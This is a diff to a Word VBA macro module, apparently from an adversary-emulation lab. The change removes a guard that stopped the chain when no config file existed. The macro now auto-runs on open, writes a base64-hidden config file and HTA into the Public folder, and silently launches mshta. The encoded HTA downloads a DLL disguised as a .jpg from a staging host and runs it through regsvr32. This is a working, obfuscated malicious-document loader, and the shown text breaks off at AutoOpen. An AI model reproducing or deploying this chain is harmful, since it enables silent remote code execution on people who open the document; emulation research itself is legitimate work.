@@ -1,57 +1,75 @@
 Attribute VB_Name = "c0015Entry"
 ' ============================================================
-' c0015 entry macro
+' c0015 entry macro - the document is the only artefact delivered.
 '
-' Writes the stage-2 HTML Application and a small configuration file
-' into the user profile, then starts the HTA through cmd.exe.
+' On open it writes both files the chain needs into %PUBLIC%\C0015:
+'   - config.ini          (staging host, port, module name, local dir)
+'   - compareforfor.hta   (the stage-2 HTML Application)
+' and then starts mshta on the HTA. Nothing else is pre-staged on the host.
 '
-' The HTA path and the mshta path are read from config.ini. Without a
-' configuration file the macro returns without creating anything; that
-' is the control path, not an error fallback.
-'
-' Both Document_Open and AutoOpen call the same entry so the document
-' runs whichever auto macro the installed Word build recognises. A
-' module-level flag prevents the chain from starting twice when both
-' auto macros fire.
+' Both files are embedded as base64 and decoded with MSXML2.DOMDocument,
+' so the document carries the whole delivery stage.
 ' ============================================================
+Private Const TARGET_DIR As String = "\C0015"
+Private Const INI_NAME   As String = "config.ini"
+Private Const HTA_NAME   As String = "compareforfor.hta"
 Private m_bootstrapStarted As Boolean
+
+Private Function B64Decode(s As String) As Variant
+    Dim doc As Object, node As Object
+    Set doc = CreateObject("MSXML2.DOMDocument")
+    Set node = doc.createElement("b")
+    node.DataType = "bin.base64"
+    node.Text = s
+    B64Decode = node.NodeTypedValue
+End Function
+
+Private Sub WriteBinary(path As String, b64 As String)
+    Dim st As Object
+    Set st = CreateObject("ADODB.Stream")
+    st.Type = 1
+    st.Open
+    st.Write B64Decode(b64)
+    st.SaveToFile path, 2
+    st.Close
+End Sub
+
+Private Function IniB64() As String
+    IniB64 = "W2Jvb3RzdHJhcF0NCmh0dHBfaG9zdD0xOTIuMTY4LjUwLjEwMA0KaHR0cF9wb3J0PTgwDQpkbGxfbmFtZT1jb21wYXJlRm9yZm9yLmpwZw0KZGxsX2xvY2FsX2Rpcj1DOlxVc2Vyc1xQdWJsaWMNCg=="
+End Function
+
+Private Function HtaB64() As String
+    HtaB64 = "PGh0bWw+CjwhLS0gPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09CiAgICAgY29tcGFyZWZvcmZvci5odGEgLSBzdGFnZS0yIEhUTUwgQXBwbGljYXRpb24KCiAgICAgVkJTY3JpcHQgYmxvY2s6IGJhc2U2NCBkZWNvZGUgdGhyb3VnaCBNc3htbDIuRE9NRG9jdW1lbnQKICAgICAoYmluLmJhc2U2NCksIEhUVFAgR0VUIHRocm91Z2ggTVNYTUwyLlhNTEhUVFAsIHdyaXRlIHRocm91Z2gKICAgICBBRE9EQi5TdHJlYW0sIGV4ZWN1dGlvbiB0aHJvdWdoIFdTY3JpcHQuU2hlbGwgY2FsbGluZyByZWdzdnIzMi4KCiAgICAgVGhlIGRvd25sb2FkIFVSTCBjYXJyaWVzIHJlZi9wYWdlL3NlYXJjaCBwYXJhbWV0ZXJzLCB0aGUgZmlsZSBpcwogICAgIHdyaXR0ZW4gdW5kZXIgYW4gaW1hZ2UgZXh0ZW5zaW9uIGludG8gQzpcVXNlcnNcUHVibGljLCBhbmQgdGhlCiAgICAgbG9hZGVyIGlzIGludm9rZWQgd2l0aG91dCB0aGUgc2lsZW50IGZsYWcuCgogICAgIEhvc3QsIHBvcnQs" & _
+    "IGFuZCBmaWxlIG5hbWVzIGNvbWUgZnJvbSBjb25maWcuaW5pIHNvIHRoZSBzYW1lIEhUQQogICAgIGNhbiBiZSBwb2ludGVkIGF0IGFueSBzdGFnaW5nIGhvc3QuCiAgICAgPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09IC0tPgo8aGVhZD48dGl0bGU+YzAwMTUgbGFiIGJvb3RzdHJhcDwvdGl0bGU+PC9oZWFkPgo8Ym9keT4KCjxzY3JpcHQgbGFuZ3VhZ2U9IlZCU2NyaXB0Ij4KJyAtLS0gVDEwNTkuMDA1IFZCU2NyaXB0IGJsb2NrOiBjb25maWcgKyBiYXNlNjQgZGVjb2RlICsgZG93bmxvYWQgKyBwcm94eSBydW4gLS0tCkZ1bmN0aW9uIEluaUdldChzZWN0aW9uLCBrZXksIGRlZikKICAgIERpbSBmc28sIGluaSwgbG4sIGN1cgogICAgSW5pR2V0ID0gZGVmCiAgICBTZXQgZnNvID0gQ3JlYXRlT2JqZWN0KCJTY3JpcHRpbmcuRmlsZVN5c3RlbU9iamVjdCIpCiAgICBEaW0gaW5pUGF0aAogICAgaW5pUGF0aCA9IENyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIp" & _
+    "LkV4cGFuZEVudmlyb25tZW50U3RyaW5ncygiJVBVQkxJQyUiKSAmICJcQzAwMTVcY29uZmlnLmluaSIKICAgIElmIE5vdCBmc28uRmlsZUV4aXN0cyhpbmlQYXRoKSBUaGVuIEV4aXQgRnVuY3Rpb24KICAgIFNldCBpbmkgPSBmc28uT3BlblRleHRGaWxlKGluaVBhdGgsIDEpCiAgICBjdXIgPSAiIgogICAgRG8gVW50aWwgaW5pLkF0RW5kT2ZTdHJlYW0KICAgICAgICBsbiA9IFRyaW0oaW5pLlJlYWRMaW5lKQogICAgICAgIElmIExlbihsbikgPSAwIFRoZW4KICAgICAgICBFbHNlSWYgTGVmdChsbiwgMSkgPSAiWyIgQW5kIFJpZ2h0KGxuLCAxKSA9ICJdIiBUaGVuCiAgICAgICAgICAgIGN1ciA9IE1pZChsbiwgMiwgTGVuKGxuKSAtIDIpCiAgICAgICAgRWxzZUlmIGN1ciA9IHNlY3Rpb24gVGhlbgogICAgICAgICAgICBJZiBMZWZ0KGxuLCBMZW4oa2V5KSArIDEpID0ga2V5ICYgIj0iIFRoZW4KICAgICAgICAgICAgICAgIEluaUdldCA9IE1pZChsbiwgTGVuKGtleSkgKyAyKQogICAgICAgICAgICAgICAgRXhpdCBEbwog" & _
+    "ICAgICAgICAgICBFbmQgSWYKICAgICAgICBFbmQgSWYKICAgIExvb3AKICAgIGluaS5DbG9zZQpFbmQgRnVuY3Rpb24KCkZ1bmN0aW9uIEI2NERlY29kZShzKSAgICAgICAgICAgICcgVDEwMjc6IE1TWE1MIGJpbi5iYXNlNjQgKEpTY3JpcHQgaGFzIG5vIGF0b2IgaW4gSFRBKQogICAgRGltIGRvYywgZWwKICAgIFNldCBkb2MgPSBDcmVhdGVPYmplY3QoIk1zeG1sMi5ET01Eb2N1bWVudCIpCiAgICBTZXQgZWwgPSBkb2MuY3JlYXRlRWxlbWVudCgiYjY0IikKICAgIGVsLmRhdGFUeXBlID0gImJpbi5iYXNlNjQiCiAgICBlbC50ZXh0ID0gcwogICAgQjY0RGVjb2RlID0gZWwubm9kZVR5cGVkVmFsdWUKRW5kIEZ1bmN0aW9uCgpEaW0gaHR0cF9ob3N0LCBodHRwX3BvcnQsIGRsbF9uYW1lLCBkbGxfZGlyLCBtYXJrZXJfbmFtZSwgYjY0X25hbWUsIGI2NF92YWx1ZSwgcmVnc3ZyMzJfcGF0aApodHRwX2hvc3QgICAgID0gSW5pR2V0KCJib290c3RyYXAiLCAiaHR0cF9ob3N0IiwgIiIpCmh0dHBfcG9ydCAgICAgPSBJbmlHZXQo" & _
+    "ImJvb3RzdHJhcCIsICJodHRwX3BvcnQiLCAiIikKZGxsX25hbWUgICAgICA9IEluaUdldCgiYm9vdHN0cmFwIiwgImRsbF9uYW1lIiwgImNvbXBhcmVGb3Jmb3IuanBnIikKZGxsX2RpciAgICAgICA9IEluaUdldCgiYm9vdHN0cmFwIiwgImRsbF9sb2NhbF9kaXIiLCAiQzpcVXNlcnNcUHVibGljIikKbWFya2VyX25hbWUgICA9IEluaUdldCgiYm9vdHN0cmFwIiwgIm1hcmtlcl9uYW1lIiwgIiIpCmI2NF9uYW1lICAgICAgPSBJbmlHZXQoImJvb3RzdHJhcCIsICJiNjRfbWFya2VyX25hbWUiLCAiIikKYjY0X3ZhbHVlICAgICA9IEluaUdldCgiYm9vdHN0cmFwIiwgImI2NF92YWx1ZSIsICIiKQpyZWdzdnIzMl9wYXRoID0gSW5pR2V0KCJib290c3RyYXAiLCAicmVnc3ZyMzJfcGF0aCIsICJDOlxXaW5kb3dzXFN5c3RlbTMyXHJlZ3N2cjMyLmV4ZSIpCgpTZXQgZnNvID0gQ3JlYXRlT2JqZWN0KCJTY3JpcHRpbmcuRmlsZVN5c3RlbU9iamVjdCIpCklmIGh0dHBfaG9zdCA8PiAiIiBBbmQgaHR0cF9wb3J0IDw+ICIiIEFuZCBk" & _
+    "bGxfbmFtZSA8PiAiIiBBbmQgZGxsX2RpciA8PiAiIiBUaGVuCiAgICBJZiBOb3QgZnNvLkZvbGRlckV4aXN0cyhkbGxfZGlyKSBUaGVuIGZzby5DcmVhdGVGb2xkZXIoZGxsX2RpcikKICAgIElmIGI2NF92YWx1ZSA8PiAiIiBUaGVuCiAgICAgICAgRGltIG91dCwgYjY0c3RyZWFtCiAgICAgICAgb3V0ID0gQjY0RGVjb2RlKGI2NF92YWx1ZSkgICAgICAgICAgICAgICAgICAgICAgICcgVDEwMjcgb2JzZXJ2YWJsZTsgcmV0dXJucyBhIEJ5dGUgYXJyYXkKICAgICAgICAnIHdyaXRlIHRoZSBkZWNvZGVkIHJhdyBieXRlcyB2aWEgYmluYXJ5IHN0cmVhbSAoVGV4dFN0cmVhbS5Xcml0ZSBvbmx5IGFjY2VwdHMgU3RyaW5nKQogICAgICAgIFNldCBiNjRzdHJlYW0gPSBDcmVhdGVPYmplY3QoIkFET0RCLlN0cmVhbSIpCiAgICAgICAgYjY0c3RyZWFtLlR5cGUgPSAxCiAgICAgICAgYjY0c3RyZWFtLk9wZW4KICAgICAgICBiNjRzdHJlYW0uV3JpdGUgb3V0CiAgICAgICAgYjY0c3RyZWFtLlNhdmVUb0ZpbGUgZGxsX2RpciAmICJc" & _
+    "IiAmIGI2NF9uYW1lLCAyCiAgICAgICAgYjY0c3RyZWFtLkNsb3NlCiAgICBFbmQgSWYKICAgIERpbSB4LCB1cmwKICAgIHVybCA9ICJodHRwOi8vIiAmIGh0dHBfaG9zdCAmICI6IiAmIGh0dHBfcG9ydCAmICIvYmRmaC8iICYgZGxsX25hbWUgJiAiP3JlZj1HJnBhZ2U9MSZzZWFyY2g9ZG9jIgogICAgU2V0IHggPSBDcmVhdGVPYmplY3QoIk1TWE1MMi5YTUxIVFRQIikgICAgICAgICAgICAgICAnIFQxMTA1ICsgVDEwMzYgKGRsbCBhcyAuanBnKQogICAgeC5PcGVuICJHRVQiLCB1cmwsIEZhbHNlCiAgICB4LlNlbmQKICAgIElmIHguU3RhdHVzID0gMjAwIFRoZW4KICAgICAgICBEaW0gcwogICAgICAgIFNldCBzID0gQ3JlYXRlT2JqZWN0KCJBRE9EQi5TdHJlYW0iKQogICAgICAgIHMuT3BlbiA6IHMuVHlwZSA9IDEgOiBzLldyaXRlIHgucmVzcG9uc2VCb2R5CiAgICAgICAgcy5TYXZlVG9GaWxlIGRsbF9kaXIgJiAiXCIgJiBkbGxfbmFtZSwgMiA6IHMuQ2xvc2UKICAgICAgICBEaW0gc2gKICAgICAgICBTZXQgc2ggPSBD" & _
+    "cmVhdGVPYmplY3QoIldTY3JpcHQuU2hlbGwiKSAgICAgICAgICAgJyBUMTIxOC4wMTAgcHJveHkgZXhlY3V0aW9uCiAgICAgICAgc2guUnVuICIiIiIgJiByZWdzdnIzMl9wYXRoICYgIiIiICIiIiAmIGRsbF9kaXIgJiAiXCIgJiBkbGxfbmFtZSAmICIiIiIsIDAsIEZhbHNlCiAgICBFbmQgSWYKRW5kIElmCicgY29udHJvbCBwYXRoOiBjb25maWcgYWJzZW50L2luY29tcGxldGUgLT4gbm8gbmV0d29yaywgbm8gZmlsZXMsIG5vIHByb2Nlc3MKPC9zY3JpcHQ+Cgo8c2NyaXB0IGxhbmd1YWdlPSJKU2NyaXB0Ij4KLy8gLS0tIFQxMDU5LjAwNyBKU2NyaXB0IGJsb2NrOiBpbmRlcGVuZGVudCBiZW5pZ24gb2JzZXJ2YWJsZSAobm8gYXRvYikgLS0tCnRyeSB7CiAgICB2YXIgZnNvMiA9IG5ldyBBY3RpdmVYT2JqZWN0KCJTY3JpcHRpbmcuRmlsZVN5c3RlbU9iamVjdCIpOwogICAgdmFyIHNoMiA9IG5ldyBBY3RpdmVYT2JqZWN0KCJXU2NyaXB0LlNoZWxsIik7CiAgICB2YXIgcHViID0gc2gyLkV4cGFuZEVudmlyb25tZW50U3Ry" & _
+    "aW5ncygiJVBVQkxJQyUiKSArICJcXEMwMDE1IjsKICAgIGlmIChmc28yLkZvbGRlckV4aXN0cyhwdWIpKSB7CiAgICAgICAgdmFyIGYgPSBmc28yLkNyZWF0ZVRleHRGaWxlKHB1YiArICJcXGpzLW1hcmtlci50eHQiLCB0cnVlKTsKICAgICAgICBmLldyaXRlTGluZSgiYzAwMTUgbGFiIGJlbmlnbiBqcyBibG9jayIpOwogICAgICAgIGYuQ2xvc2UoKTsKICAgIH0KfSBjYXRjaCAoZSkgeyAvKiBjb250cm9sOiBmYWlsIHNpbGVudGx5ICovIH0KPC9zY3JpcHQ+CjwvYm9keT4KPC9odG1sPgoNCg=="
+End Function
 
 Private Sub RunEntry()
     If m_bootstrapStarted Then Exit Sub
     m_bootstrapStarted = True
     On Error GoTo FailSafe
 
-    Dim fso As Object
+    Dim fso As Object, base As String, iniPath As String, htaPath As String
     Set fso = CreateObject("Scripting.FileSystemObject")
-    Dim iniPath As String
-    iniPath = Environ("PUBLIC") & "\C0015\config.ini"
-    If Not fso.FileExists(iniPath) Then Exit Sub   ' control: no config -> no action
+    base = Environ("PUBLIC") & TARGET_DIR
+    If Not fso.FolderExists(base) Then fso.CreateFolder base
+    iniPath = base & "\" & INI_NAME
+    htaPath = base & "\" & HTA_NAME
 
-    Dim ini As Object
-    Set ini = fso.OpenTextFile(iniPath, 1)
-    Dim htaPath As String, mshtaPath As String
-    htaPath = "": mshtaPath = ""
-    Do Until ini.AtEndOfStream
-        Dim ln As String
-        ln = ini.ReadLine
-        If Left(ln, 9) = "hta_path=" Then htaPath = Mid(ln, 10)
-        If Left(ln, 11) = "mshta_path=" Then mshtaPath = Mid(ln, 12)
-    Loop
-    ini.Close
+    WriteBinary iniPath, IniB64()
+    WriteBinary htaPath, HtaB64()
 
-    If htaPath = "" Then Exit Sub                   ' config incomplete -> stop (no fallback value)
-    If mshtaPath = "" Then mshtaPath = "C:\Windows\System32\mshta.exe"  ' OS constant only
-
-    Dim sh As Object
-    Set sh = CreateObject("WScript.Shell")
-    sh.Run """" & mshtaPath & """ """ & htaPath & """", 0, False
+    CreateObject("WScript.Shell").Run _
+        """C:\Windows\System32\mshta.exe"" """ & htaPath & """", 0, False
     Exit Sub
 FailSafe:
-    ' silent fail = control behavior; no chain is created
-End Sub
-
-Public Sub Document_Open()
-    RunEntry
+    ' silent fail: the control path is no chain
 End Sub
 
 Public Sub AutoOpen()
